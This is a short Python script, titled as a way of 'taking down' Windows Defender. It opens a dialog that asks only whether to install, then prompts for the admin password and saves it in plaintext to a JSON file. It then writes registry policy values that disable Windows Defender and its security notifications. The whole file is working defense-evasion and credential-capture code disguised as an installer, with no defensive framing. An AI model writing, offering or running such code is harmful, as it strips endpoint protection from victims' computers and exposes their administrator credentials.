# Takeing down windows defender 

import tkinter as tk
from tkinter import messagebox
import ctypes
import os
import winreg as reg
import getpass
import json

def is_admin():
    """Check if the script is run as an administrator."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def disable_windows_defender_and_notifications():
    """Disable Windows Defender and notifications."""
    try:
        # Disable Windows Defender
        defender_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        defender_key_name = "DisableAntiSpyware"
        
        # Path and key to disable Windows Defender notifications
        notifications_path = r"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"
        notifications_key_name = "DisableEnhancedNotifications"

        # Open registry key to disable Windows Defender
        defender_key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, defender_path)
        reg.SetValueEx(defender_key, defender_key_name, 0, reg.REG_DWORD, 1)
        reg.CloseKey(defender_key)

        # Disable Windows Defender notifications
        notifications_key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, notifications_path)
        reg.SetValueEx(notifications_key, notifications_key_name, 0, reg.REG_DWORD, 1)
        reg.CloseKey(notifications_key)

        print("Windows Defender has been disabled.")
        print("Windows Defender notifications have been disabled.")
    
    except PermissionError:
        print("Permission denied: Please run this script as an administrator.")
    except Exception as e:
        print(f"An error occurred: {e}")


def save_password_to_file(username, password):
    """Save the admin credentials to a .json file."""
    credentials = {
        "admin_username": username,
        "admin_password": password
    }
    
    # Save the credentials to a JSON file
    with open('admin_credentials.json', 'w') as json_file:
        json.dump(credentials, json_file)
    print("Admin credentials have been saved to 'admin_credentials.json'.")


def prompt_for_credentials():
    """Prompt for admin credentials."""
    # Create a Tkinter window
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    
    # Ask the user if they want to install
    install_response = messagebox.askyesno("Install", "Do you want to install?")

    if install_response:
        # Prompt for admin credentials (for demonstration purposes, actual use may vary)
        admin_username = getpass.getuser()
        admin_password = getpass.getpass("Enter admin password: ")

        # In a real-world scenario, you should securely validate the credentials here.
        # For simplicity, we are skipping the validation part in this example.

        if admin_username and admin_password:  # Basic check
            if not is_admin():
                messagebox.showerror("Error", "Admin privileges required! Please run as Administrator.")
            else:
                # Save credentials to a JSON file
                save_password_to_file(admin_username, admin_password)

                # Disable Windows Defender and Notifications
                disable_windows_defender_and_notifications()
                messagebox.showinfo("Success", "Windows Defender has been disabled.")
        else:
            messagebox.showerror("Error", "Invalid admin credentials.")
    else:
        messagebox.showinfo("Cancelled", "Installation has been cancelled.")


if __name__ == "__main__":
    prompt_for_credentials()
